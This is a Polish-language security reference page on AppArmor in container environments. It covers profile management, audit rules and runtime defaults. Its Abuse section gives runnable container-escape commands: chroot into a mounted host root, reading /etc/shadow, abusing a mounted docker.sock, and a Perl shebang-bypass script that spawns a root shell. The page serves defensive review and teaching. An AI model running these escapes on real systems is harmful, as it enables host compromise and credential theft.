# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Przegląd

AppArmor to system **Mandatory Access Control**, który stosuje ograniczenia za pomocą profili przypisanych do poszczególnych programów. W przeciwieństwie do tradycyjnych kontroli DAC, które w dużej mierze zależą od właściciela użytkownika i grupy, AppArmor pozwala kernelowi egzekwować politykę przypisaną bezpośrednio do procesu. W środowiskach kontenerowych ma to znaczenie, ponieważ workload może mieć wystarczające tradycyjne uprawnienia, aby próbować wykonać daną akcję, a mimo to zostać zablokowany, ponieważ jego profil AppArmor nie zezwala na użycie odpowiedniej ścieżki, mount, zachowania sieciowego lub capability.

Najważniejszą kwestią koncepcyjną jest to, że AppArmor działa **na podstawie ścieżek**. Dostęp do filesystemu jest określany za pomocą reguł ścieżek, a nie etykiet, jak ma to miejsce w SELinux. Dzięki temu AppArmor jest przystępny i potężny, ale oznacza to również, że bind mounty i alternatywne układy ścieżek wymagają szczególnej uwagi. Jeśli ta sama zawartość hosta stanie się dostępna pod inną ścieżką, działanie polityki może różnić się od początkowych oczekiwań operatora.

## Rola w izolacji kontenerów

Przeglądy bezpieczeństwa kontenerów często kończą się na capabilities i seccomp, ale AppArmor nadal ma znaczenie po wykonaniu tych kontroli. Wyobraźmy sobie kontener, który ma większe uprawnienia, niż powinien, albo workload, który ze względów operacyjnych potrzebował jednej dodatkowej capability. AppArmor nadal może ograniczać dostęp do plików, zachowanie mountów, networking oraz wzorce wykonywania w sposób, który powstrzymuje oczywistą ścieżkę nadużycia. Dlatego wyłączenie AppArmor „tylko po to, aby aplikacja zaczęła działać” może niepostrzeżenie przekształcić jedynie ryzykowną konfigurację w taką, która jest aktywnie exploitable.

## Laboratorium

Aby sprawdzić, czy AppArmor jest aktywny na hoście, użyj:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Aby sprawdzić, w jakim środowisku uruchomiony jest bieżący proces kontenera:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
Różnica ta jest pouczająca. W normalnym przypadku proces powinien wyświetlać kontekst AppArmor powiązany z profilem wybranym przez runtime. W przypadku unconfined ta dodatkowa warstwa ograniczeń znika.

Możesz również sprawdzić, co według Dockera zostało zastosowane:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Użycie runtime

Docker może zastosować domyślny lub niestandardowy profil AppArmor, gdy host go obsługuje. Podman może również integrować się z AppArmor w systemach opartych na AppArmor, chociaż w dystrybucjach, w których pierwszoplanową rolę pełni SELinux, często to drugi system MAC jest najważniejszy. Kubernetes może udostępniać politykę AppArmor na poziomie workloadu w węzłach, które faktycznie obsługują AppArmor. LXC i powiązane system-container environments z rodziny Ubuntu również intensywnie korzystają z AppArmor.

Praktyczna kwestia jest taka, że AppArmor nie jest „funkcją Docker”. Jest funkcją host-kernel, którą różne runtime'y mogą zdecydować się zastosować. Jeśli host jej nie obsługuje lub runtime otrzyma polecenie uruchomienia w trybie unconfined, zakładana ochrona w rzeczywistości nie istnieje.

W przypadku Kubernetes nowoczesnym API jest `securityContext.appArmorProfile`. Od Kubernetes `v1.30` starsze beta annotations AppArmor są deprecated. Na obsługiwanych hostach `RuntimeDefault` jest domyślnym profilem, natomiast `Localhost` wskazuje na profil, który musi być już załadowany w węźle. Ma to znaczenie podczas review, ponieważ manifest może wyglądać na zgodny z AppArmor, a mimo to całkowicie zależeć od wsparcia po stronie węzła i wstępnie załadowanych profili.<sup>[[1]](#references)</sup>

Jeden subtelny, ale użyteczny szczegół operacyjny polega na tym, że jawne ustawienie `appArmorProfile.type: RuntimeDefault` jest bardziej restrykcyjne niż zwykłe pominięcie tego pola. Jeśli pole zostanie jawnie ustawione, a węzeł nie obsługuje AppArmor, admission powinno się nie powieść. Jeśli pole zostanie pominięte, workload może nadal zostać uruchomiony w węźle bez AppArmor i po prostu nie otrzymać tej dodatkowej warstwy confinement. Z punktu widzenia attackera jest to dobry powód, aby sprawdzić zarówno manifest, jak i rzeczywisty stan węzła.<sup>[[1]](#references)</sup>

Na hostach z obsługą Docker i AppArmor najbardziej znanym profilem domyślnym jest `docker-default`. Ten profil jest generowany na podstawie AppArmor template z Moby i jest istotny, ponieważ wyjaśnia, dlaczego niektóre capability-based PoC nadal kończą się niepowodzeniem w domyślnym kontenerze. Ogólnie rzecz biorąc, `docker-default` zezwala na zwykłą komunikację sieciową, blokuje zapisy do znacznej części `/proc`, odmawia dostępu do wrażliwych części `/sys`, blokuje operacje mount oraz ogranicza ptrace, przez co nie jest on uniwersalnym prymitywem do sondowania hosta. Zrozumienie tej warstwy bazowej pomaga odróżnić sytuację „kontener ma `CAP_SYS_ADMIN`” od sytuacji „kontener może faktycznie użyć tej capability przeciwko interesującym mnie interfejsom kernela”.

## Zarządzanie profilami

Profile AppArmor są zazwyczaj przechowywane w `/etc/apparmor.d/`. Częstą konwencją nazewniczą jest zastępowanie ukośników w ścieżce executable kropkami. Na przykład profil dla `/usr/bin/man` jest zwykle przechowywany jako `/etc/apparmor.d/usr.bin.man`. Ten szczegół ma znaczenie zarówno podczas defense, jak i assessment, ponieważ po poznaniu nazwy aktywnego profilu można często szybko zlokalizować odpowiadający mu plik na hoście.

Przydatne host-side management commands obejmują:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
Powodem, dla którego te polecenia mają znaczenie w kontekście materiału referencyjnego dotyczącego container-security, jest to, że wyjaśniają, jak profile są faktycznie tworzone, ładowane, przełączane do complain mode oraz modyfikowane po zmianach w aplikacji. Jeśli operator ma zwyczaj przełączania profili do complain mode podczas rozwiązywania problemów i zapomina później przywrócić enforcement, kontener może wyglądać na chroniony w dokumentacji, jednocześnie w rzeczywistości działając ze znacznie mniejszymi ograniczeniami.

### Tworzenie i aktualizowanie profili

`aa-genprof` może obserwować zachowanie aplikacji i pomóc interaktywnie wygenerować profile:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` może wygenerować szablon profilu, który można później załadować za pomocą `apparmor_parser`:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Gdy plik binarny ulega zmianie i konieczna jest aktualizacja polityki, `aa-logprof` może odtworzyć odmowy znalezione w logach i pomóc operatorowi zdecydować, czy je zezwolić, czy odrzucić:
```bash
sudo aa-logprof
```
### Logi

Odmowy AppArmor są często widoczne w `auditd`, syslogu lub narzędziach takich jak `aa-notify`:
```bash
sudo aa-notify -s 1 -v
```
Jest to przydatne operacyjnie i ofensywnie. Obrońcy używają tego do dopracowywania profili. Atakujący używają tego, aby ustalić, która dokładnie ścieżka lub operacja jest blokowana oraz czy AppArmor jest mechanizmem kontroli blokującym łańcuch exploita.

### Identyfikowanie Dokładnego Pliku Profilu

Gdy runtime wyświetla konkretną nazwę profilu AppArmor dla kontenera, często przydatne jest powiązanie tej nazwy z plikiem profilu na dysku:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Jest to szczególnie przydatne podczas przeglądu po stronie hosta, ponieważ wypełnia lukę między „kontener twierdzi, że działa z profilem `lowpriv`” a „rzeczywiste reguły znajdują się w tym konkretnym pliku, który można poddać audytowi lub przeładować”.

### Reguły o wysokiej wartości do audytu

Gdy możesz odczytać profil, nie poprzestawaj na prostych wierszach `deny`. Kilka typów reguł znacząco wpływa na to, jak skuteczny będzie AppArmor przeciwko próbie container escape:<sup>[[2]](#references)</sup>

- `ux` / `Ux`: wykonuje docelowy binary jako unconfined. Jeśli dostępny helper, shell lub interpreter jest dozwolony przez `ux`, zazwyczaj jest to pierwsza rzecz do przetestowania.
- `px` / `Px` oraz `cx` / `Cx`: wykonują przejścia profili podczas exec. Nie są one automatycznie niebezpieczne, ale warto je przeprowadzić audytowi, ponieważ przejście może zakończyć się w znacznie szerszym profilu niż bieżący.
- `change_profile`: pozwala taskowi przełączyć się do innego załadowanego profilu, natychmiast lub przy następnym exec. Jeśli docelowy profil jest słabszy, może to stać się zamierzoną drogą ucieczki z restrykcyjnej domeny.
- `flags=(complain)`, `flags=(unconfined)` lub nowsze `flags=(prompt)`: powinny wpływać na poziom zaufania, jakim darzysz profil. `complain` loguje odmowy zamiast ich egzekwowania, `unconfined` usuwa granicę, a `prompt` zależy od ścieżki decyzyjnej w userspace zamiast od czystej odmowy egzekwowanej przez kernel.
- `userns` lub `userns create,`: nowsza polityka AppArmor może kontrolować tworzenie user namespaces. Jeśli profil kontenera jawnie na to zezwala, zagnieżdżone user namespaces pozostają możliwe, nawet gdy platforma używa AppArmor jako części swojej strategii hardeningu.

Przydatne grep po stronie hosta:
```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Ten rodzaj audytu jest często bardziej przydatny niż przeglądanie setek zwykłych reguł plików. Jeśli breakout zależy od wykonania helpera, wejścia do nowej namespace albo ucieczki do mniej restrykcyjnego profilu, odpowiedź często jest ukryta w tych regułach związanych z przejściami, a nie w oczywistych wierszach w stylu `deny /etc/shadow r`.

## Błędne konfiguracje

Najbardziej oczywistym błędem jest `apparmor=unconfined`. Administratorzy często ustawiają tę opcję podczas debugowania aplikacji, która nie działała, ponieważ profil prawidłowo zablokował coś niebezpiecznego lub nieoczekiwanego. Jeśli flaga pozostanie w środowisku produkcyjnym, cała warstwa MAC zostaje w praktyce usunięta.

Innym subtelnym problemem jest założenie, że bind mounts są nieszkodliwe, ponieważ uprawnienia plików wyglądają normalnie. Ponieważ AppArmor działa na podstawie ścieżek, udostępnianie ścieżek hosta pod alternatywnymi lokalizacjami montowania może powodować niepożądane interakcje z regułami ścieżek. Trzecim błędem jest zapominanie, że nazwa profilu w pliku konfiguracyjnym niewiele znaczy, jeśli kernel hosta faktycznie nie wymusza działania AppArmor.

## Abuse

Gdy AppArmor jest wyłączony, operacje, które wcześniej były ograniczone, mogą nagle zacząć działać: odczytywanie wrażliwych ścieżek przez bind mounts, uzyskiwanie dostępu do części procfs lub sysfs, które powinny być trudniejsze do wykorzystania, wykonywanie działań związanych z montowaniem, jeśli pozwalają na nie również capabilities/seccomp, albo używanie ścieżek, które profil normalnie by zablokował. AppArmor jest często mechanizmem wyjaśniającym, dlaczego próba breakout oparta na capabilities „powinna zadziałać” w teorii, ale mimo to kończy się niepowodzeniem w praktyce. Usuń AppArmor, a ta sama próba może zacząć działać.

Jeśli podejrzewasz, że AppArmor jest głównym mechanizmem powstrzymującym path-traversal, bind-mount lub mount-based abuse chain, pierwszym krokiem jest zwykle porównanie tego, co staje się dostępne z profilem i bez niego. Na przykład, jeśli ścieżka hosta jest zamontowana wewnątrz kontenera, zacznij od sprawdzenia, czy możesz ją przeglądać i odczytywać:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Jeśli kontener ma również niebezpieczną `capability`, taką jak `CAP_SYS_ADMIN`, jednym z najbardziej praktycznych testów jest sprawdzenie, czy AppArmor jest mechanizmem kontroli blokującym operacje `mount` lub dostęp do wrażliwych systemów plików kernela:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
W środowiskach, w których ścieżka hosta jest już dostępna za pośrednictwem bind mount, utrata AppArmor może również przekształcić problem ujawnienia informacji tylko do odczytu w bezpośredni dostęp do plików hosta:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Celem tych poleceń nie jest to, że sam AppArmor tworzy breakout. Chodzi o to, że po usunięciu AppArmor wiele ścieżek nadużyć opartych na systemie plików i mountach staje się natychmiast możliwych do przetestowania.

### Pełny przykład: AppArmor wyłączony + zamontowany root hosta

Jeśli kontener ma już root hosta zamontowany bind mountem w `/host`, usunięcie AppArmor może zmienić zablokowaną ścieżkę nadużycia systemu plików w pełny host escape:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Gdy powłoka wykonuje polecenia za pośrednictwem systemu plików hosta, workload faktycznie wydostał się poza granicę kontenera:
```bash
id
hostname
cat /etc/shadow | head
```
### Pełny przykład: AppArmor wyłączony + runtime socket

Jeśli rzeczywistą barierą był AppArmor chroniący stan runtime, zamontowany socket może wystarczyć do pełnego wydostania się:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Dokładna ścieżka zależy od punktu montowania, ale wynik jest taki sam: AppArmor nie uniemożliwia już dostępu do runtime API, a runtime API może uruchomić kontener umożliwiający kompromitację hosta.

### Pełny przykład: obejście bind-mount oparte na ścieżce

Ponieważ AppArmor bazuje na ścieżkach, ochrona `/proc/**` nie chroni automatycznie tej samej zawartości hostowego procfs, gdy jest ona dostępna za pośrednictwem innej ścieżki:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
Wpływ zależy od tego, co dokładnie jest zamontowane i czy alternatywna ścieżka omija również inne zabezpieczenia, ale ten wzorzec jest jednym z najwyraźniejszych powodów, dla których AppArmor należy analizować razem z układem montowania, a nie w izolacji.

### Pełny przykład: Shebang Bypass

Polityka AppArmor czasami wskazuje ścieżkę interpretera w sposób, który nie uwzględnia w pełni wykonywania skryptu za pośrednictwem obsługi shebang. Historyczny przykład obejmował użycie skryptu, którego pierwszy wiersz wskazuje na ograniczony interpreter:<sup>[[3]](#references)</sup>
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Ten rodzaj przykładu jest ważny jako przypomnienie, że intencja profilu i rzeczywista semantyka wykonania mogą się różnić. Podczas przeglądania AppArmor w środowiskach kontenerowych należy zwrócić szczególną uwagę na łańcuchy interpreterów i alternatywne ścieżki wykonania.

## Kontrole

Celem tych kontroli jest szybkie uzyskanie odpowiedzi na trzy pytania: czy AppArmor jest włączony na hoście, czy bieżący proces jest objęty ograniczeniami oraz czy runtime faktycznie zastosował profil do tego kontenera?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Co jest tutaj interesujące:

- Jeśli `/proc/self/attr/current` pokazuje `unconfined`, workload nie korzysta z ograniczeń AppArmor.
- Jeśli `aa-status` pokazuje, że AppArmor jest wyłączony lub niezaładowany, nazwa profilu w konfiguracji runtime jest w większości kosmetyczna.
- Jeśli `docker inspect` pokazuje `unconfined` lub nieoczekiwany custom profile, często właśnie dlatego działa ścieżka nadużycia oparta na filesystemie lub mouncie.
- Jeśli `/sys/kernel/security/apparmor/profiles` nie zawiera oczekiwanego profilu, sama konfiguracja runtime lub orchestratora nie jest wystarczająca.
- Jeśli rzekomo zahardenowany profil zawiera reguły w stylu `ux`, szerokie `change_profile`, `userns` lub `flags=(complain)`, praktyczna granica bezpieczeństwa może być znacznie słabsza, niż sugeruje nazwa profilu.

Jeśli kontener już ma podwyższone uprawnienia z powodów operacyjnych, pozostawienie AppArmor włączonego często decyduje o tym, czy mamy do czynienia z kontrolowanym wyjątkiem, czy ze znacznie szerszą awarią bezpieczeństwa.

## Domyślne ustawienia Runtime

| Runtime / platforma | Stan domyślny | Domyślne zachowanie | Typowe ręczne osłabienie |
| --- | --- | --- | --- |
| Docker Engine | Domyślnie włączony na hostach obsługujących AppArmor | Używa profilu AppArmor `docker-default`, chyba że zostanie on nadpisany | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Zależny od hosta | AppArmor jest obsługiwany przez `--security-opt`, ale dokładne ustawienie domyślne zależy od hosta/runtime i jest mniej uniwersalne niż udokumentowany profil `docker-default` w Dockerze | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Domyślne ustawienie warunkowe | Jeśli `appArmorProfile.type` nie jest określone, domyślnie używane jest `RuntimeDefault`, ale jest ono stosowane tylko wtedy, gdy AppArmor jest włączony na node | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` ze słabym profilem, node bez obsługi AppArmor |
| containerd / CRI-O w Kubernetes | Zależny od obsługi przez node/runtime | Typowe runtime obsługiwane przez Kubernetes wspierają AppArmor, ale faktyczne egzekwowanie nadal zależy od obsługi przez node i ustawień workloadu | Tak jak w wierszu Kubernetes; bezpośrednia konfiguracja runtime również może całkowicie pominąć AppArmor |

W przypadku AppArmor najważniejszą zmienną jest często **host**, a nie tylko runtime. Ustawienie profilu w manifeście nie zapewnia ograniczeń na node, na którym AppArmor nie jest włączony.

## References

- [1] [Kubernetes security context: AppArmor profile fields and node-support behavior](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [2] [Ubuntu 24.04 `apparmor.d(5)` manpage: exec transitions, `change_profile`, `userns`, and profile flags](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
- [3] [HTB: Nunchucks - AppArmor shebang bypass with a Perl script](https://0xdf.gitlab.io/2021/11/02/htb-nunchucks.html)

{{#include ../../../../banners/hacktricks-training.md}}
